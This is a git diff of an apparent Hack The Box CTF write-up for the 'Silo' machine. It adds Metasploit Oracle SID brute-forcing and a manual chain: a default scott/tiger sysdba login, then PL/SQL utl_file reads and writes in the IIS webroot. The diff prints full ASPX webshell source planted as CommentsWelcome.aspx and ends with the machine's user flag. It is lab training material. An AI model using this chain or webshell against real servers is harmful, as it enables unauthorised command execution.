@@ -13,6 +13,7 @@ categories:
 tags:
   - ODAT
   - Oracle
+  - Metasploit
 ---
 
 ![](/assets/images/htb-writeup-silo/silo_logo.png)
@@ -89,8 +90,8 @@ SMB         10.129.95.188   445    SILO             [*] Windows Server 2012 R2 S
 [!] Authentication error on 10.129.95.188
 ```
 Oracle Database calls our attention. We could solve this machine using [ODAT](https://github.com/quentinhardy/odat) or manually
-1. ODAT
->  1. Installation
+## ODAT
+1. Installation
 ```bash
 git clone https://github.com/quentinhardy/odat
 cd odat/
@@ -126,14 +127,37 @@ This will be enough to use the tool.
 ```bash
 ❯ python3 odat.py --help
 ```
-> 2. Sidguesser
+2. Sidguesser
+> 1. Using ODAT
 ```bash
-❯ python3 odat.py sidguesser -s 10.129.95.188
+❯ python3 odat.py sidguesser -s 10.129.95.188 -p 1521
 [1] (10.129.95.188:1521): Searching valid SIDs
 [1.1] Searching valid SIDs thanks to a well known SID list on the 10.129.95.188:1521 server
 [+] 'XE' is a valid SID
 ```
-> 3. Passwordguesser.
+> 2. Using metasploit
+```bash
+❯ service postgresql start
+❯ msfconsole -q
+[msf](Jobs:0 Agents:0) >> search oracle
+   80   auxiliary/scanner/oracle/sid_brute                                                     normal     No     Oracle TNS Listener SID Bruteforce
+[msf](Jobs:0 Agents:0) >> use 80
+[msf](Jobs:0 Agents:0) auxiliary(scanner/oracle/sid_brute) >> set rhosts 10.129.95.188
+rhosts => 10.129.95.188
+[msf](Jobs:0 Agents:0) auxiliary(scanner/oracle/sid_brute) >> run
+[*] 10.129.95.188:1521    - Checking 572 SIDs against 10.129.95.188:1521
+[*] 10.129.95.188:1521    - 10.129.95.188:1521 Oracle - Checking 'LINUX8174'...
+[*] 10.129.95.188:1521    - 10.129.95.188:1521 Oracle - Refused 'LINUX8174'
+[*] 10.129.95.188:1521    - 10.129.95.188:1521 Oracle - Checking 'ORACLE'...
+[*] 10.129.95.188:1521    - 10.129.95.188:1521 Oracle - Refused 'ORACLE'
+[*] 10.129.95.188:1521    - 10.129.95.188:1521 Oracle - Checking 'XE'...
+[+] 10.129.95.188:1521    - 10.129.95.188:1521 Oracle - 'XE' is valid
+[+] 10.129.95.188:1521    - 10.129.95.188:1521 Oracle - 'PLSEXTPROC' is valid
+^C[*] 10.129.95.188:1521    - Caught interrupt from the console...
+[*] Auxiliary module execution completed
+```
+3. Passwordguesser.
+> 1. Using ODAT
 ```bash
 ❯ head -n 3 accounts/accounts.txt
 abm/abm
@@ -145,7 +169,7 @@ By default, ODAT is using accounts/accounts.txt as dictionary. But we will use o
 ❯ locate oracle_ | grep pass
 /usr/share/metasploit-framework/data/wordlists/hci_oracle_passwords.csv
 /usr/share/metasploit-framework/data/wordlists/oracle_default_passwords.csv
-/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
+/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt (We choose this ==> auxiliary/scanner/oracle/oracle_login)
 ```
 Change the format
 ```bash
@@ -159,13 +183,13 @@ Let's utilize our custom dictionary
 [+] Accounts found on 10.129.95.188:1521/sid:XE:
 scott/tiger
 ```
-Are this valid credentials?
+> 2. Using metasploit (It may not work due to case-sensitive Oracle change)
 ```bash
-❯ crackmapexec smb 10.129.95.188 -u 'scott' -p 'tiger'
-SMB         10.129.95.188   445    SILO             [*] Windows Server 2012 R2 Standard 9600 x64 (name:SILO) (domain:SILO) (signing:False) (SMBv1:True)
-SMB         10.129.95.188   445    SILO             [-] SILO\scott:tiger STATUS_LOGON_FAILURE
+[msf](Jobs:0 Agents:0) auxiliary(scanner/oracle/sid_brute) >> search scanner/oracle
+   3   auxiliary/scanner/oracle/oracle_login                        normal  No     Oracle RDBMS Login Utility
 ```
-> 4. It seems that is not working. Let's continue with odat and the utlfile option to test if we are able to see the /etc/hosts on the Windows machine
+4. Obtain a shell
+Let's test if we are able to see the /etc/hosts on the Windows machine
 ```bash
 ❯ python3 odat.py utlfile -s 10.129.95.188 -d 'XE' -U 'scott' -P 'tiger' --getFile 'C:\Windows\System32\drivers\etc\' 'hosts' 'hosts' --sysdba
 [1] (10.129.95.188:1521): Read the hosts file stored in C:\Windows\System32\drivers\etc\ on the 10.129.95.188 server
@@ -197,6 +221,85 @@ C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>whoami
 nt authority\system
 ```
 ***
+
+## Manually
+
+This DB has default credentials [scott/tiger](https://www.complexsql.com/what-are-default-username-and-password-for-oracle-list/)
+
+```bash
+❯ sqlplus64 scott/tiger@10.129.95.188:1521/XE as sysdba
+Connected to:
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+```
+This two commands show us our privileges.
+```sql
+SQL> select * from session_privs;
+SQL> select * from user_role_privs;
+```
+Let's read a file to test
+```sql
+SQL>declare
+   f utl_file.file_type;
+   s varchar(400);
+begin
+   f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');
+   utl_file.get_line(f,s);
+   utl_file.fclose(f);
+   dbms_output.put_line(s);
+end;
+
+SQL> set serveroutput ON
+SQL> /
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+PL/SQL procedure successfully completed.
+```
+Do I have write privileges?
+```sql
+SQL> declare
+  2    f utl_file.file_type;
+  s varchar(6000) := 'Only for a test';
+begin
+  f := utl_file.fopen('/inetpub/wwwroot', 'firsttest.txt','W');
+  utl_file.put_line(f,s);
+  utl_file.fclose(f);
+end;
+  3    4    5    6    7    8    9
+ 10
+ 11  /
+
+PL/SQL procedure successfully completed.
+```
+```bash
+❯ curl -s -X GET http://10.129.95.188:80/firsttest.txt
+Only for a test
+```   
+
+Can I upload a webshell? It is recommended that the size of the webshell may be lower than 1024 bytes.
+I will use this webshell and downsize.
+```bash
+❯ cp /usr/share/webshells/aspx/cmdasp.aspx ~/silo/exploits
+❯ sed -z 's/\n//g' cmdasp.aspx  | xclip -selection clipboard
+```
+
+```sql
+SQL> declare
+  2    f utl_file.file_type;
+  s varchar(6000) := '<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("<pre>");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("</pre>");}</script><HTML><body ><form id="cmd" method="post" runat="server"><asp:TextBox id="txtArg"  runat="server" Width="250px"></asp:TextBox><asp:Button id="testing"  runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button><asp:Label id="lblText" runat="server">Command:</asp:Label></form></body></HTML>';
+begin
+  f := utl_file.fopen('/inetpub/wwwroot', 'CommentsWelcome.aspx','W');
+  utl_file.put_line(f,s);
+  utl_file.fclose(f);
+end;
+  3    4    5    6    7    8    9
+ 10  /
+
+PL/SQL procedure successfully completed.
+```
+![](/assets/images/htb-writeup-silo/silo1.png)
+***
+
 
 User flag: b2397834bc61db5f4662b02f2b61abec
 
